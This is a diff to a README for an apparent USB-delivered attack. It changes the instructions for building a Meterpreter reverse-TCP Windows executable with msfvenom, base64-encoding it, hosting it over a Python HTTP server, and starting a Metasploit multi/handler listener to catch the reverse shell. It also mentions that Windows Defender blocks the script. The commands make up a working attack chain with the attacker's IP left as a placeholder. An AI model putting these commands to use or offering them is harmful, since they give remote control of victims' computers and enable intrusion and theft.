@@ -11,7 +11,8 @@ Please note that Windows Defender will stop this script from running. Windows De
 This command will create a Windows executable file, encoded in base64. Make sure to replace `0.0.0.0` with your IP.
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -e cmd/powershell_base64 -o winner.exe.b64
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -o winner.exe
+base64 winner.exe > winner.exe.b64
 ```
 
 ## Hosting Payload
@@ -24,15 +25,21 @@ python -m http.server 8888
 
 ## Metasploit Listener
 
-The following is a sequence of commands to be run. This will prepare you to receive the reverse shell. Make sure to replace `0.0.0.0` with your IP.
+Start metasploit by running the following command.
 
-- `msfconsole`
-- `use exploit/multi/handler`
-- `set payload windows/x64/meterpreter_reverse_tcp`
-- `setg LHOST 0.0.0.0`
-- `setg LPORT 4444`
-- `exploit`
+```
+msfconsole
+```
 
+The following is a sequence of commands to be run once metasploit is loaded. They will prepare you to receive the reverse shell. Make sure to replace `0.0.0.0` with your IP.
+
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+setg LHOST 0.0.0.0
+setg LPORT 4444
+exploit
+```
 
 ## Programming USB
 
